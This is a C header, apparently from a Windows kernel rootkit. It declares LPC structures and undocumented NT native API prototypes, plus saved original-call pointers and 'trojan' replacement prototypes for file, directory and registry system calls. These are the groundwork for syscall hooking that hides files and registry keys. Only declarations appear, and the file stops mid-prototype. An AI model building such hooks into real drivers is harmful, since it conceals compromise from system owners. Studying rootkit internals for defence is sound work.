
#ifndef __RK_IOMAN_H__
#define __RK_IOMAN_H__

/* ________________________________________________________________________________
 . local structs
 . ________________________________________________________________________________ */

/* ________________________________________________
 . Local Procedure Calls
 . ________________________________________________ */

/* Maximum size of the message */
#define MAX_MESSAGE_DATA                0x130

/* Types of LPC messges */
#define UNUSED_MSG_TYPE                 0x00
#define LPC_REQUEST                     0x01
#define LPC_REPLY                       0x02
#define LPC_DATAGRAM                    0x03
#define LPC_LOST_REPLY                  0x04
#define LPC_PORT_CLOSED                 0x05
#define LPC_CLIENT_DIED                 0x06
#define LPC_EXCEPTION                   0x07
#define LPC_DEBUG_EVENT                 0x08
#define LPC_ERROR_EVENT                 0x09
#define LPC_CONNECTION_REQUEST			0x0A

/* Structure for the LPC message */
typedef struct LpcMessage {
	/* LPC Message Header */
	USHORT  ActualMessageLength;
	USHORT  TotalMessageLength;
	ULONG MessageType;
	ULONG ClientProcessId;
	ULONG ClientThreadId;
	ULONG MessageId;
	ULONG SharedSectionSize;

	/* LPC Message Data, taken care of maximum message */
	CCHAR  MessageData[MAX_MESSAGE_DATA];
} LPCMESSAGE, *PLPCMESSAGE;

/* Structures required for big LPC through shared section */
typedef struct Unknown1 {
	ULONG Length;
	HANDLE SectionHandle;
	ULONG Param1;
	ULONG SectionSize;
	ULONG ClientBaseAddress;
	ULONG ServerBaseAddress;
} LPCSECTIONINFO, *PLPCSECTIONINFO;

typedef struct Unknown2 {
	ULONG Length;
	ULONG SectionSize;
	ULONG ServerBaseAddress;
} LPCSECTIONMAPINFO, *PLPCSECTIONMAPINFO;
#pragma pack()




/* ________________________________________________________________________________
 . pointer defs for file functions
 . ________________________________________________________________________________ */
typedef NTSTATUS (*NTCREATEFILE)(
            PHANDLE FileHandle,
            ACCESS_MASK DesiredAccess,
            POBJECT_ATTRIBUTES ObjectAttributes,
            PIO_STATUS_BLOCK IoStatusBlock,
            PLARGE_INTEGER AllocationSize OPTIONAL,
            ULONG FileAttributes,
            ULONG ShareAccess,
            ULONG CreateDisposition,
            ULONG CreateOptions,
            PVOID EaBuffer OPTIONAL,
            ULONG EaLength
);
extern NTCREATEFILE OldNtCreateFile;

typedef NTSTATUS (*ZWOPENFILE)(
	PHANDLE phFile,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK pIoStatusBlock,
	ULONG ShareMode,
	ULONG OpenMode
);
extern ZWOPENFILE OldZwOpenFile;



/* ________________________________________________________________________________
 . pointer defs for registry functions
 . ________________________________________________________________________________ */
typedef NTSTATUS (*ZWOPENKEY)( 	
	IN PHANDLE, 
	IN OUT ACCESS_MASK, 
	IN POBJECT_ATTRIBUTES 
);
extern ZWOPENKEY OldZwOpenKey;

typedef NTSTATUS (*ZWQUERYKEY)( 								  
	IN HANDLE, 
	IN KEY_INFORMATION_CLASS,
    OUT PVOID, 
	IN ULONG, 
	OUT PULONG 
);
extern ZWQUERYKEY OldZwQueryKey;

typedef NTSTATUS (*ZWQUERYVALUEKEY)( 
	IN HANDLE, 
	IN PUNICODE_STRING, 
    IN KEY_VALUE_INFORMATION_CLASS,
    OUT PVOID, 
	IN ULONG, 
	OUT PULONG 
);
extern ZWQUERYVALUEKEY OldZwQueryValueKey;

typedef NTSTATUS (*ZWENUMERATEVALUEKEY)( 
	IN HANDLE, 
	IN ULONG,  
    IN KEY_VALUE_INFORMATION_CLASS,
    OUT PVOID, 
	IN ULONG, 
	OUT PULONG 
);
extern ZWENUMERATEVALUEKEY OldZwEnumerateValueKey;

typedef NTSTATUS (*ZWENUMERATEKEY)( 	
	IN HANDLE, 
	IN ULONG,
    IN KEY_INFORMATION_CLASS,
    OUT PVOID, 
	IN ULONG, 
	OUT PULONG 
);
extern ZWENUMERATEKEY OldZwEnumerateKey;

typedef NTSTATUS (*ZWSETVALUEKEY)( 	
	IN HANDLE KeyHandle, 
	IN PUNICODE_STRING ValueName,
    IN ULONG TitleIndex, 
	IN ULONG Type, 
    IN PVOID Data, 
	IN ULONG DataSize 
);
extern ZWSETVALUEKEY OldZwSetValueKey;

typedef NTSTATUS (*ZWCREATEKEY)( 	
	OUT PHANDLE, 
	IN ACCESS_MASK,
    IN POBJECT_ATTRIBUTES, 
	IN ULONG,
    IN PUNICODE_STRING, 
	IN ULONG, 
	OUT PULONG 
);
extern ZWCREATEKEY OldZwCreateKey;

typedef NTSTATUS (*ZWDELETEVALUEKEY)(
	IN HANDLE, 
	IN PUNICODE_STRING 
);
extern ZWDELETEVALUEKEY OldZwDeleteValueKey;

typedef NTSTATUS (*ZWDELETEKEY)( IN HANDLE );
extern ZWDELETEKEY OldZwDeleteKey;

typedef NTSTATUS (*ZWFLUSHKEY)( IN HANDLE );
extern ZWFLUSHKEY OldZwFlushKey;

/* ________________________________________________________________________________
 . prototypes for file trojan calls
 . ________________________________________________________________________________ */
NTSYSAPI
NTSTATUS
NTAPI NewNtCreateFile(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize OPTIONAL,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer OPTIONAL,
    ULONG EaLength
	);

NTSYSAPI
NTSTATUS
NTAPI NewZwOpenFile(
	PHANDLE phFile,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK pIoStatusBlock,
	ULONG ShareMode,
	ULONG OpenMode
);

NTSYSAPI
NTSTATUS
NTAPI
NewZwQueryDirectoryFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN BOOLEAN bReturnOnlyOneEntry,
	IN PUNICODE_STRING PathMask OPTIONAL,
	IN BOOLEAN bRestartQuery
);

/* ________________________________________________________________________________
 . prototypes for file real calls
 . ________________________________________________________________________________ */



/* ________________________________________________________________________________
 . prototypes for registry trojan calls
 . ________________________________________________________________________________ */

NTSYSAPI
NTSTATUS
NTAPI NewZwOpenKey(
	PHANDLE phKey,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
	);

NTSYSAPI
NTSTATUS
NTAPI NewZwQueryKey(
	HANDLE hKey,
	KEY_INFORMATION_CLASS KeyInfoClass,
	PVOID KeyInfoBuffer,
	ULONG KeyInfoBufferLength,
	PULONG BytesCopied
	);

NTSYSAPI
NTSTATUS
NTAPI NewZwQueryValueKey(
	HANDLE hKey,
	PUNICODE_STRING uValueName,
	KEY_VALUE_INFORMATION_CLASS KeyValueInfoClass,
	PVOID KeyValueInfoBuffer,
	ULONG KeyValueInfoBufferLength,
	PULONG BytesCopied
	);

NTSYSAPI
NTSTATUS
NTAPI NewZwEnumerateValueKey(
	HANDLE hKey,
	ULONG Index,
	KEY_VALUE_INFORMATION_CLASS  KeyValueInfoClass,
	PVOID KeyValueInfoBuffer,
	ULONG KeyValueInfoBufferLength,
	PULONG BytesCopied
	);

NTSYSAPI
NTSTATUS
NTAPI NewZwEnumerateKey(
	HANDLE hKey,
	ULONG Index,
	KEY_INFORMATION_CLASS  KeyInfoClass,
	PVOID KeyInfoBuffer,
	ULONG KeyInfoBufferLength,
	PULONG BytesCopied
	);

NTSYSAPI
NTSTATUS
NTAPI NewZwDeleteKey(
	HANDLE hKey
	);

NTSYSAPI
NTSTATUS
NTAPI NewZwFlushKey(
	HANDLE hKey
	);

NTSYSAPI
NTSTATUS
NTAPI NewZwSetValueKey(
	HANDLE hKey,
	PUNICODE_STRING uValueName,
	ULONG TitleIndex,
	ULONG ValueType,
	PVOID pValueData,
	ULONG pValueDataLength
	);

NTSYSAPI
NTSTATUS
NTAPI NewZwSetValueKey(
	HANDLE hKey,
	PUNICODE_STRING uValueName,
	ULONG TitleIndex,
	ULONG ValueType,
	PVOID pValueData,
	ULONG pValueDataLength
	);

NTSYSAPI
NTSTATUS
NTAPI NewZwCreateKey(
	PHANDLE phKey,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	ULONG TitleIndex,
	PUNICODE_STRING Class,
	ULONG CreateOptions,
	PULONG pDisposition
	);

NTSYSAPI
NTSTATUS
NTAPI NewZwDeleteValueKey(
	IN HANDLE hKey,
	IN PUNICODE_STRING pValueName
	);



/* ________________________________________________________________________________
 . Prototypes for registry real calls
 . ________________________________________________________________________________ */
NTSYSAPI
NTSTATUS
NTAPI
NtOpenKey(
	OUT PHANDLE phKey,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes
);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenKey(
	OUT PHANDLE phKey,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes
);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateKey(
	OUT PHANDLE phKey,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN ULONG TitleIndex,
	IN PUNICODE_STRING Class,
	IN ULONG CreateOptions,
	OUT PULONG pDisposition
);

NTSYSAPI
NTSTATUS
NTAPI
ZwCreateKey(
	OUT PHANDLE phKey,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN ULONG TitleIndex,
	IN PUNICODE_STRING Class,
	IN ULONG CreateOptions,
	OUT PULONG pDisposition
);

NTSYSAPI
NTSTATUS
NTAPI
NtSetValueKey(
	IN HANDLE hKey,
	IN PUNICODE_STRING uValueName,
	IN ULONG TitleIndex,
	IN ULONG ValueType,
	IN PVOID pValueData,
	IN ULONG pValueDataLength
);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetValueKey(
	IN HANDLE hKey,
	IN PUNICODE_STRING uValueName,
	IN ULONG TitleIndex,
	IN ULONG ValueType,
	IN PVOID pValueData,
	IN ULONG pValueDataLength
);

NTSYSAPI
NTSTATUS
NTAPI
NtEnumerateKey(
	IN HANDLE hKey,
	IN ULONG Index,
	IN KEY_INFORMATION_CLASS  KeyInfoClass,
	OUT PVOID KeyInfoBuffer,
	IN ULONG KeyInfoBufferLength,
	OUT PULONG BytesCopied
);

NTSYSAPI
NTSTATUS
NTAPI
ZwEnumerateKey(
	IN HANDLE hKey,
	IN ULONG Index,
	IN KEY_INFORMATION_CLASS  KeyInfoClass,
	OUT PVOID KeyInfoBuffer,
	IN ULONG KeyInfoBufferLength,
	OUT PULONG BytesCopied
);

NTSYSAPI
NTSTATUS
NTAPI
NtEnumerateValueKey(
	IN HANDLE hKey,
	IN ULONG Index,
	IN KEY_VALUE_INFORMATION_CLASS  KeyValueInfoClass,
	OUT PVOID KeyValueInfoBuffer,
	IN ULONG KeyValueInfoBufferLength,
	OUT PULONG BytesCopied
);

NTSYSAPI
NTSTATUS
NTAPI
ZwEnumerateValueKey(
	IN HANDLE hKey,
	IN ULONG Index,
	IN KEY_VALUE_INFORMATION_CLASS  KeyValueInfoClass,
	OUT PVOID KeyValueInfoBuffer,
	IN ULONG KeyValueInfoBufferLength,
	OUT PULONG BytesCopied
);

NTSYSAPI
NTSTATUS
NTAPI
NtDeleteValueKey(
	IN HANDLE hKey,
	IN PUNICODE_STRING pValueName
);

NTSYSAPI
NTSTATUS
NTAPI
ZwDeleteValueKey(
	IN HANDLE hKey,
	IN PUNICODE_STRING pValueName
);

NTSYSAPI
NTSTATUS
NTAPI
NtDeleteKey(
	IN HANDLE hKey
);

NTSYSAPI
NTSTATUS
NTAPI
ZwDeleteKey(
	IN HANDLE hKey
);

NTSYSAPI
NTSTATUS
NTAPI
NtFlushKey(
	IN HANDLE hKey
);

NTSYSAPI
NTSTATUS
NTAPI
ZwFlushKey(
	IN HANDLE hKey
);

NTSYSAPI
NTSTATUS
NTAPI
NtInitializeRegistry(
	IN ULONG UnknownParam
);

NTSTATUS
NTAPI
ZwInitializeRegistry(
	IN ULONG UnknownParam
);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryKey(
	IN HANDLE hKey,
	IN KEY_INFORMATION_CLASS KeyInfoClass,
	OUT PVOID KeyInfoBuffer,
	IN ULONG KeyInfoBufferLength,
	OUT PULONG BytesCopied
);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryKey(
	IN HANDLE hKey,
	IN KEY_INFORMATION_CLASS KeyInfoClass,
	OUT PVOID KeyInfoBuffer,
	IN ULONG KeyInfoBufferLength,
	OUT PULONG BytesCopied
);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryValueKey(
	IN HANDLE hKey,
	IN PUNICODE_STRING uValueName,
	IN KEY_VALUE_INFORMATION_CLASS KeyValueInfoClass,
	OUT PVOID KeyValueInfoBuffer,
	IN ULONG KeyValueInfoBufferLength,
	OUT PULONG BytesCopied
);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryValueKey(
	IN HANDLE hKey,
	IN PUNICODE_STRING uValueName,
	IN KEY_VALUE_INFORMATION_CLASS KeyValueInfoClass,
	OUT PVOID KeyValueInfoBuffer,
	IN ULONG KeyValueInfoBufferLength,
	OUT PULONG BytesCopied
);

NTSYSAPI
NTSTATUS
NTAPI
NtSaveKey(
	IN HANDLE hKey,
	IN HANDLE hFile
);

NTSYSAPI
NTSTATUS
NTAPI
ZwSaveKey(
	IN HANDLE hKey,
	IN HANDLE hFile
);

NTSYSAPI
NTSTATUS
NTAPI
NtLoadKey(
	IN POBJECT_ATTRIBUTES KeyNameAttributes,
	IN POBJECT_ATTRIBUTES HiveFileNameAttributes
);

NTSYSAPI
NTSTATUS
NTAPI
ZwLoadKey(
	IN POBJECT_ATTRIBUTES KeyNameAttributes,
	IN POBJECT_ATTRIBUTES HiveFileNameAttributes
);

NTSYSAPI
NTSTATUS
NTAPI
NtLoadKey2(
	IN POBJECT_ATTRIBUTES KeyNameAttributes,
	IN POBJECT_ATTRIBUTES HiveFileNameAttributes,
	IN ULONG ulFlags
);

NTSTATUS
NTAPI
ZwLoadKey2(
	IN POBJECT_ATTRIBUTES KeyNameAttributes,
	IN POBJECT_ATTRIBUTES HiveFileNameAttributes,
	IN ULONG ulFlags
);


NTSYSAPI
NTSTATUS
NTAPI
NtUnloadKey(
	IN POBJECT_ATTRIBUTES KeyNameAttributes
);

NTSYSAPI
NTSTATUS
NTAPI
ZwUnloadKey(
	IN POBJECT_ATTRIBUTES KeyNameAttributes
);

#define REG_NOTIFY_CHANGE_NAME          (0x00000001L) // Create or delete (child)
#define REG_NOTIFY_CHANGE_ATTRIBUTES    (0x00000002L)
#define REG_NOTIFY_CHANGE_LAST_SET      (0x00000004L) // time stamp
#define REG_NOTIFY_CHANGE_SECURITY      (0x00000008L)

NTSYSAPI
NTSTATUS
NTAPI
NtNotifyChangeKey(
	IN HANDLE hKey,
	IN HANDLE hEvent,
	IN PIO_APC_ROUTINE ApcRoutine,
	IN PVOID ApcRoutineContext,
	IN PIO_STATUS_BLOCK pIoStatusBlock,
	IN ULONG NotifyFilter,
	IN BOOLEAN bWatchSubtree,
	OUT PVOID RegChangesDataBuffer,
	IN ULONG RegChangesDataBufferLength,
	IN BOOLEAN bAynchronous
);

NTSYSAPI
NTSTATUS
NTAPI
ZwNotifyChangeKey(
	IN HANDLE hKey,
	IN HANDLE hEvent,
	IN PIO_APC_ROUTINE ApcRoutine,
	IN PVOID ApcRoutineContext,
	IN PIO_STATUS_BLOCK pIoStatusBlock,
	IN ULONG NotifyFilter,
	IN BOOLEAN bWatchSubtree,
	OUT PVOID RegChangesDataBuffer,
	IN ULONG RegChangesDataBufferLength,
	IN BOOLEAN bAynchronous
);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryMultipleValueKey(
	IN HANDLE hKey,
	IN OUT PKEY_VALUE_ENTRY ValueNameArray,
	IN ULONG nElementsValueNameArray,
	OUT PVOID ValueDataBuffer,
	IN OUT PULONG ValueDataBufferSize,
	OUT PULONG SizeRequired
);

NTSTATUS
NTAPI
ZwQueryMultipleValueKey(
	IN HANDLE hKey,
	IN OUT PKEY_VALUE_ENTRY ValueNameArray,
	IN ULONG nElementsValueNameArray,
	OUT PVOID ValueDataBuffer,
	IN OUT PULONG ValueDataBufferSize,
	OUT PULONG SizeRequired
);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationKey(
	IN HANDLE hKey,
	IN KEY_SET_INFORMATION_CLASS KeySetInfoClass,
	IN PKEY_WRITE_TIME_INFORMATION pInfoBuffer,
	IN ULONG pInfoBufferLength
);

NTSTATUS
NTAPI
ZwSetInformationKey(
	IN HANDLE hKey,
	IN KEY_SET_INFORMATION_CLASS KeySetInfoClass,
	IN PKEY_WRITE_TIME_INFORMATION pInfoBuffer,
	IN ULONG pInfoBufferLength
);

NTSYSAPI
NTSTATUS
NTAPI
NtRestoreKey(
	IN HANDLE hKey,
	IN HANDLE hFile,
	IN ULONG Flags
);

NTSYSAPI
NTSTATUS
NTAPI
ZwRestoreKey(
	IN HANDLE hKey,
	IN HANDLE hFile,
	IN ULONG Flags
);

NTSYSAPI
NTSTATUS
NTAPI
NtReplaceKey(
	IN POBJECT_ATTRIBUTES NewHiveFile,
	IN HANDLE hKey,
	IN POBJECT_ATTRIBUTES BackupHiveFile
);

NTSYSAPI
NTSTATUS
NTAPI
ZwReplaceKey(
	IN POBJECT_ATTRIBUTES NewHiveFile,
	IN HANDLE hKey,
	IN POBJECT_ATTRIBUTES BackupHiveFile
);


/* ________________________________________________
 . Local Procedure Calls
 . ________________________________________________ */

/* Undocumented LPC API */
NTSYSAPI
NTSTATUS
NTAPI
NtCreatePort(
	PHANDLE PortHandle, 
	POBJECT_ATTRIBUTES ObjectAttributes,
	ULONG MaxConnectInfoLength, 
	ULONG MaxDataLength, 
	ULONG Unknown
);

NTSYSAPI
NTSTATUS
NTAPI
ZwCreatePort(
	PHANDLE PortHandle, 
	POBJECT_ATTRIBUTES ObjectAttributes,
	ULONG MaxConnectInfoLength, 
	ULONG MaxDataLength, 
	ULONG Unknown
);

/*
 * MaxConnectInfoLength 
 * MaxDataLength - only validations
 * Unknown - unused
 */
NTSYSAPI
NTSTATUS
NTAPI
NtConnectPort(
	PHANDLE PortHandle, 
	PUNICODE_STRING PortName, 
	PULONG Unknown, /* Can not be NULL */
	PLPCSECTIONINFO Unknown1, /* Used in Big LPC */
	PLPCSECTIONMAPINFO Unknown2, /* Used in Big LPC */
	PVOID Unknown3, /* Can be NULL */
	PVOID ConnectInfo,
	PULONG pConnectInfoLength
);

NTSYSAPI
NTSTATUS
NTAPI
ZwConnectPort(
	PHANDLE PortHandle, 
	PUNICODE_STRING PortName, 
	PULONG Unknown, /* Can not be NULL */
	PLPCSECTIONINFO Unknown1, /* Used in Big LPC */
	PLPCSECTIONMAPINFO Unknown2, /* Used in Big LPC */
	PVOID Unknown3, /* Can be NULL */
	PVOID ConnectInfo,
	PULONG pConnectInfoLength
);

NTSYSAPI
NTSTATUS
NTAPI
NtReplyWaitReceivePort(
	PHANDLE PortHandle, 
	PULONG Unknown ,
	PLPCMESSAGE pLpcMessageOut, 
	PLPCMESSAGE pLpcMessageIn
);

NTSYSAPI
NTSTATUS
NTAPI
ZwReplyWaitReceivePort(
	PHANDLE PortHandle, 
	PULONG Unknown ,
	PLPCMESSAGE pLpcMessageOut, 
	PLPCMESSAGE pLpcMessageIn
);

NTSYSAPI
NTSTATUS
NTAPI
NtAcceptConnectPort(
	PHANDLE PortHandle, 
	ULONG Unknown, // Pass 0
	PLPCMESSAGE pLpcMessage, 
	ULONG Unknown1, // 1 
	ULONG Unknown3, // 0
	PLPCSECTIONMAPINFO pSectionMapInfo
);

NTSYSAPI
NTSTATUS
NTAPI
ZwAcceptConnectPort(
	PHANDLE PortHandle, 
	ULONG Unknown, // Pass 0
	PLPCMESSAGE pLpcMessage, 
	ULONG Unknown1, // 1 
	ULONG Unknown3, // 0
	PLPCSECTIONMAPINFO pSectionMapInfo
);

NTSYSAPI
NTSTATUS
NTAPI
NtCompleteConnectPort(
	HANDLE PortHandle
);

NTSYSAPI
NTSTATUS
NTAPI
ZwCompleteConnectPort(
	HANDLE PortHandle
);

NTSYSAPI
NTSTATUS
NTAPI
NtRequestWaitReplyPort(
	HANDLE PortHandle, 
	PLPCMESSAGE pLpcMessageIn,
	PLPCMESSAGE pLpcMessageOut
);

NTSYSAPI
NTSTATUS
NTAPI
ZwRequestWaitReplyPort(
	HANDLE PortHandle, 
	PLPCMESSAGE pLpcMessageIn,
	PLPCMESSAGE pLpcMessageOut
);

NTSYSAPI
NTSTATUS
NTAPI
NtListenPort(
	HANDLE PortHandle, 
	PLPCMESSAGE pLpcMessage
);

NTSYSAPI
NTSTATUS
NTAPI
ZwListenPort(
	HANDLE PortHandle, 
	PLPCMESSAGE pLpcMessage
);

NTSYSAPI
NTSTATUS
NTAPI
NtRequestPort(
	HANDLE PortHandle, 
	PLPCMESSAGE pLpcMessage
);

NTSYSAPI
NTSTATUS
NTAPI
ZwRequestPort(
	HANDLE PortHandle, 
	PLPCMESSAGE pLpcMessage
);

NTSYSAPI
NTSTATUS
NTAPI
NtReplyPort(
	HANDLE PortHandle, 
	PLPCMESSAGE pLpcMessage
);

NTSYSAPI
NTSTATUS
NTAPI
ZwReplyPort(
	HANDLE PortHandle, 
	PLPCMESSAGE pLpcMessage
);


NTSYSAPI
NTSTATUS
NTAPI
NtRegisterThreadTerminatePort(
	HANDLE PortHandle
);

NTSYSAPI
NTSTATUS
NTAPI
ZwRegisterThreadTerminatePort(
	HANDLE PortHandle
);

NTSYSAPI
NTSTATUS
NTAPI
NtSetDefaultHardErrorPort(
	HANDLE PortHandle
);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetDefaultHardErrorPort(
	HANDLE PortHandle
);


/* This system service does not seem to return any information about the port,
it gets pointer to port object using ObReferenceObjectByHandle and closes the
pointer and returns STATUS_SUCCESS */
NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationPort(
	HANDLE PortHandle, 
	ULONG InfoClass,
	PVOID Buffer,
	ULONG BufferSize,
	PULONG BytesReturned
);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryInformationPort(
	HANDLE PortHandle, 
	ULONG InfoClass,
	PVOID Buffer,
	ULONG BufferSize,
	PULONG BytesReturned
);

NTSYSAPI
NTSTATUS
NTAPI
NtReplyWaitReplyPort(
	HANDLE PortHandle, 
	PLPCMESSAGE pLpcMessage
);

NTSYSAPI
NTSTATUS
NTAPI
ZwReplyWaitReplyPort(
	HANDLE PortHandle, 
	PLPCMESSAGE pLpcMessage
);

NTSYSAPI
NTSTATUS
NTAPI
NtImpersonateClientOfPort(
	HANDLE PortHandle, 
	PLPCMESSAGE pLpcMessage
);

NTSYSAPI
NTSTATUS
NTAPI
ZwImpersonateClientOfPort(
	HANDLE PortHandle, 
	PLPCMESSAGE pLpcMessage
);

//Windows 2000 only
NTSYSAPI
NTSTATUS
NTAPI
NtCreateWaitablePort(
	PHANDLE PortHandle, 
	POBJECT_ATTRIBUTES ObjectAttributes,
	ULONG MaxConnectInfoLength, 
	ULONG MaxDataLength, 
	ULONG Unknown
);

NTSYSAPI
NTSTATUS
NTAPI
ZwCreateWaitablePort(
	PHANDLE PortHandle, 
	POBJECT_ATTRIBUTES ObjectAttributes,
	ULONG MaxConnectInfoLength, 
	ULONG MaxDataLength, 
	ULONG Unknown
);
/* _____________________________________________
 . Driver load/unload routines
 . _____________________________________________ */
NTSYSAPI
NTSTATUS
NTAPI
NtLoadDriver(
	IN PUNICODE_STRING DriverRegistryEntry
);

NTSYSAPI
NTSTATUS
NTAPI
ZwLoadDriver(
	IN PUNICODE_STRING DriverRegistryEntry
);


NTSYSAPI
NTSTATUS
NTAPI
NtUnloadDriver(
	IN PUNICODE_STRING DriverRegistryEntry
);

NTSYSAPI
NTSTATUS
NTAPI
ZwUnloadDriver(
	IN PUNICODE_STRING DriverRegistryEntry
);


/* ____________________________________________________________________
 . prototypes for Iomanager real calls
 . ____________________________________________________________________ */
/* __________________________________________________________
 . IO Manager
 . __________________________________________________________ */

NTSYSAPI
NTSTATUS
NTAPI
NtCancelIoFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK IoStatusBlock
);

NTSYSAPI
NTSTATUS
NTAPI
ZwCancelIoFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK IoStatusBlock
);


NTSYSAPI
NTSTATUS
NTAPI
NtCreateFile(
    OUT PHANDLE phFile,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER AllocationSize OPTIONAL,
    IN ULONG FileAttributes,
    IN ULONG ShareAccess,
    IN ULONG CreateDisposition,
    IN ULONG CreateOptions,
    IN PVOID EaBuffer OPTIONAL,
    IN ULONG EaLength
);

NTSYSAPI
NTSTATUS
NTAPI
ZwCreateFile(
    OUT PHANDLE phFile,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER AllocationSize OPTIONAL,
    IN ULONG FileAttributes,
    IN ULONG ShareAccess,
    IN ULONG CreateDisposition,
    IN ULONG CreateOptions,
    IN PVOID EaBuffer OPTIONAL,
    IN ULONG EaLength
);


NTSYSAPI
NTSTATUS
NTAPI
NtCreateIoCompletion(
	OUT PHANDLE phIoCompletionPort,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN ULONG nConcurrentThreads
);

NTSYSAPI
NTSTATUS
NTAPI
ZwCreateIoCompletion(
	OUT PHANDLE phIoCompletionPort,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN ULONG nConcurrentThreads
);


NTSYSAPI
NTSTATUS
NTAPI
NtOpenIoCompletion(
	OUT PHANDLE phIoCompletionPort,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes
);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenIoCompletion(
	OUT PHANDLE phIoCompletionPort,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes
);

typedef struct _OVERLAPPED {
	ULONG   Internal;
	ULONG   InternalHigh;
	ULONG   Offset;
	ULONG   OffsetHigh;
	HANDLE  hEvent;
} OVERLAPPED, *LPOVERLAPPED;

NTSYSAPI
NTSTATUS
NTAPI
NtSetIoCompletion(
	IN HANDLE hIoCompletionPort,
	ULONG CompletionKey,
	LPOVERLAPPED pOverlapped,
	NTSTATUS NtStatus,
	ULONG NumberOfBytesTransferred
);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetIoCompletion(
	IN HANDLE hIoCompletionPort,
	ULONG CompletionKey,
	LPOVERLAPPED pOverlapped,
	NTSTATUS NtStatus,
	ULONG NumberOfBytesTransferred
);

typedef enum _IOCOMPLETIONPORT_INFO_CLASS {
	IoCompletionPortBasicInfo
} IOCOMPLETIONPORT_INFO_CLASS;

typedef struct IoCompletionPortBasicInformation_t {
	ULONG NumberOfEvents;
} IOCOMPLETIONPORT_BASIC_INFO, *PIOCOMPLETIONPORT_BASIC_INFO;


NTSYSAPI
NTSTATUS
NTAPI
NtQueryIoCompletion(
	IN HANDLE hIoCompletionPort,
	IN IOCOMPLETIONPORT_INFO_CLASS InfoClass,
	OUT PVOID Buffer,
	IN ULONG BufferLen,
	OUT PULONG BytesReturned
);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryIoCompletion(
	IN HANDLE hIoCompletionPort,
	IN IOCOMPLETIONPORT_INFO_CLASS InfoClass,
	OUT PVOID Buffer,
	IN ULONG BufferLen,
	OUT PULONG BytesReturned
);

NTSYSAPI
NTSTATUS
NTAPI
NtRemoveIoCompletion(
	IN HANDLE hIoCompletion,
	OUT PULONG lpCompletionKey,
	OUT LPOVERLAPPED *pOverlapped,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	IN PLARGE_INTEGER Timeout
);

NTSYSAPI
NTSTATUS
NTAPI
ZwRemoveIoCompletion(
	IN HANDLE hIoCompletion,
	OUT PULONG lpCompletionKey,
	OUT LPOVERLAPPED *pOverlapped,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	IN PLARGE_INTEGER Timeout
);

NTSYSAPI
NTSTATUS
NTAPI
NtDeleteFile(
	IN POBJECT_ATTRIBUTES ObjectAttributes
);

NTSYSAPI
NTSTATUS
NTAPI
ZwDeleteFile(
	IN POBJECT_ATTRIBUTES ObjectAttributes
);

NTSYSAPI
NTSTATUS
NTAPI
NtDeviceIoControlFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN ULONG DeviceIoControlCode,
	IN PVOID InBuffer OPTIONAL,
	IN ULONG InBufferLength,
	OUT PVOID OutBuffer OPTIONAL,
	IN ULONG OutBufferLength
);

NTSYSAPI
NTSTATUS
NTAPI
ZwDeviceIoControlFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
